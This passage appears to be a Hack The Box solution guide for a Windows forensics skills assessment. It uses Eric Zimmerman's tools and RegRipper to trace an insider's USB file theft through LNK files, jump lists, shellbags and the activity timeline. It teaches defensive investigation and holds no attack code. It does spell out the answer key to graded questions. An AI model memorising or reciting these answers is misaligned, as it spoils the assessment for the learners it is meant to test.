.\LECmd.exe -f "C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Roaming\Microsoft\Windows\Recent\McWhiskey Acquisition Expected Q4 2022.lnk"
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> .\LECmd.exe -f "C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Roaming\Microsoft\Windows\Recent\McWhiskey Acquisition Expected Q4 2022.lnk"

LECmd version 1.5.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/LECmd

Command line: -f C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Roaming\Microsoft\Windows\Recent\McWhiskey Acquisition Expected Q4 2022.lnk

<SNIP>

Working Directory: X:\Finance\2022\Strategy

--- Link information ---
Flags: CommonNetworkRelativeLinkAndPathSuffix

  Network share information
    Device name: X:
    Share name: {hidden}
    Provider type: WnncNetLanman
    Share flags: 3

  Common path: Finance\2022\Strategy\McWhiskey Acquisition Expected Q4 2022.pdf
```

Answer: `\\Server1\McBeer`

# Skills Assessment

## Question 2

### "Open JumpListExplorer and parse the Jumplist data from the location: "C:\\Tools\\DFIR-Data\\evidence\\skills-assessment\\D\\Users\\gary\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations". In 'Quick Access', two items are visible. Identify the Local Path for the document residing on the E:\\ drive. The answer format is E:\\\*\*\*\*\* \*\*\*\*\*\*\*\*\****.***"

Students will change their current working directory to the `JumpListExplorer` sub-directory and will start `JumpListExplorer.exe`:

Code: powershell

```powershell
cd JumpListExplorer
.\JumpListExplorer.exe
```

```
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> cd JumpListExplorer
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\JumpListExplorer> .\JumpListExplorer.exe
```

Students will click on `File` and `Load jump lists`, and they will navigate to the `C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations` directory and select the three files and will click on `Open`:

![[HTB Solutions/Others/z. images/99cfa5735e90f407ace3e033ffb3c7fa_MD5.webp]]

Next, students will select the first entry with the `App ID Description` of `Quick Access` in the `Source File Name` table and will identify the path in the absolute path column:

![[HTB Solutions/Others/z. images/b394f0c9fec196f27f9905bc9914ec16_MD5.webp]]

Answer: `E:\Board Presentation.pdf`

# Skills Assessment

## Question 3

### "Using LECmd.exe, perform an analysis on the LNK file located at: "C:\\Tools\\DFIR-Data\\evidence\\skills-assessment\\D\\Users\\gary\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Board Presentation.lnk". In the Volume information section, find the value of the Drive type and use it as the answer. The answer format is R\*\*\*\*\*\*\*\* \*\*\*\*\*\*\* \*\*\*\*\* (\*\*\*\*\*\*, *S*)"

Students will close the `JumpListExplorer` application and will go up a directory, use `LECmd.exe` to scrutinize the `Board Presentation.lnk` file, finding the drive type in the `Drive type` variable in the output:

Code: powershell

```powershell
cd ..
.\LECmd.exe -f "C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Roaming\Microsoft\Windows\Recent\Board Presentation.lnk"
```

```
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\JumpListExplorer> cd ..
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> .\LECmd.exe -f "C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Roaming\Microsoft\Windows\Recent\Board Presentation.lnk"

LECmd version 1.5.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/LECmd

Command line: -f C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Roaming\Microsoft\Windows\Recent\Board Presentation.lnk

<SNIP>

--- Link information ---
Flags: VolumeIdAndLocalBasePath

>> Volume information
  Drive type: {hidden}
  Serial number: 6C183CE6
  Label: (No label)
  Local path: E:\Board Presentation.pdf

--- Target ID information (Format: Type ==> Value) ---
```

Answer: `Removable storage media (Floppy, USB)`

# Skills Assessment

## Question 4

### "Examine the data inside the USBTOR registry key in the SYSTEM hive. What is the timestamp when the USB drive was connected to the user's system? The answer format is hh:mm:ss"

Students will navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `SYSTEM`registry hive located in the `C:\Tools\DFIR-Data\evidence\skills-assessment\D\Windows\System32\config` directory with the `usbstor` plugin, finding information related to the connection time of the USB to the system in the `First InstallDate` (or the `InstallDate`) variable in the output:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\skills-assessment\D\Windows\System32\config\SYSTEM" -p usbstor
```

```
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\skills-assessment\D\Windows\System32\config\SYSTEM" -p usbstor
Launching usbstor v.20200515

usbstor v.20200515
(System) Get USBStor key info

USBStor
ControlSet001\Enum\USBStor

Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP [2022-02-28 17:52:27]
  S/N: 1C6F654E59A3B0C039D32E71&0 [2022-02-28 17:52:27Z]
  Device Parameters LastWrite: [2022-02-28 17:52:27Z]
  Properties LastWrite       : [2022-02-28 17:52:27Z]
    FriendlyName          : Kingston DataTraveler 2.0 USB Device
    First InstallDate     : 2022-02-28 {hidden}Z
    InstallDate           : 2022-02-28 {hidden}Z
    Last Arrival          : 2022-02-28 17:52:27Z
    Last Removal          : 2022-02-28 17:53:37Z
```

Answer: `17:52:27`

# Skills Assessment

## Question 5

### "Use ShellBags Explorer to parse the UsrClass.dat file from the location: "C:\\Tools\\DFIR-Data\\evidence\\skills-assessment\\D\\Users\\gary\\AppData\\Local\\Microsoft\\Windows". Examine the folders accessed on the 'X:' drive. What is the name of the folder that starts with S? The answer format is S\*\*\*\*\*\*\*"

Students will navigate to `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer` and will start `ShellBagsExplorer.exe`, click on the `X` button when prompted for email address contact.

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer
.\ShellBagsExplorer.exe
```

```
PS C:\Tools\DFIR-Data\Tools\RegRipper> cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer> .\ShellBagsExplorer.exe
```

Next, students will click on `File` and `Load offline registry`, navigate to `C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Local\Microsoft\Windows` and select the `UsrClass.dat` registry, and `Open`:

![[HTB Solutions/Others/z. images/998f62cfea32705697dc14d7ee89f3ad_MD5.webp]]

Next, students will expand the `X:` drive, `Finance`, and `2022` to find the answer in the form of a directory:

![[HTB Solutions/Others/z. images/16775a26196474c5cd55a10e03fe89d0_MD5.webp]]

Answer: `Strategy`

# Skills Assessment

## Question 6

### "Perform an analysis of the user's activity timeline in "ActivityCache.db". The user also performed some suspicious browser searches related to data exfiltration. Use the Quora URL as the answer. The answer format is https://\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

Students will navigate to `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6` and use `WxTCmd.exe` to parse the database in the `C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Local\ConnectedDevicesPlatform\L.gary` directory, and save the output in the `C:\tmp` directory in the form of CSV:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
.\WxTCmd.exe -f C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Local\ConnectedDevicesPlatform\L.gary\ActivitiesCache.db --csv C:\tmp
```

```
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer> cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> .\WxTCmd.exe -f C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Local\ConnectedDevicesPlatform\L.gary\ActivitiesCache.db --csv C:\tmp

WxTCmd version 1.0.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/WxTCmd

Command line: -f C:\Tools\DFIR-Data\evidence\skills-assessment\D\Users\gary\AppData\Local\ConnectedDevicesPlatform\L.gary\ActivitiesCache.db --csv C:\tmp

ActivityOperation entries found: 0
Activity_PackageId entries found: 86
Activity entries found: 32

Results saved to: C:\tmp

Processing complete in 0.3694 seconds

Unable to delete SQLite.Interop.dll. Delete manually if needed
```

Next, students will navigate to the `TimelineExplorer` sub-directory and use `TimelineExplorer` to analyze the generated CSV file:

```powershell
cd TimelineExplorer
.\TimelineExplorer.exe
```
```
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> cd TimelineExplorer
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\TimelineExplorer> .\TimelineExplorer.exe
```

Students will click on `File` -> `Open`, then navigate to the `C:\tmp` directory and open the `_Activity.csv` file:

![[HTB Solutions/Others/z. images/ed1e3ffd6c4a703bf16caba7fe5d8f58_MD5.webp]]

Subsequently, students will use the `Content Info` column to filter results containing the string `https`, finding the URL related to Quora:

![[HTB Solutions/Others/z. images/9f87dc48832ce6789551b76212741f8c_MD5.webp]]

Answer: `https://www.quora.com/How-can-I-secretly-take-files-off-a-computer-using-a-USB`

# Skills Assessment

## Question 7

### "During the analysis of "ActivityCache.db", you should notice two events for file copy/paste activity. What is the timestamp for the first file copy/paste event? The answer format is hh:mm:ss"

Students will reuse the previously opened session in `TimelineExplorer`, remove the related filter from the `Content Info` column, and use the `Activity Type` column to filter results containing only the string `Copy`.

![[HTB Solutions/Others/z. images/bd586eb00d124c0d5bdd33d624577bce_MD5.webp]]

Students will find the answer in the `Start Time` column.

Answer: `17:52:59`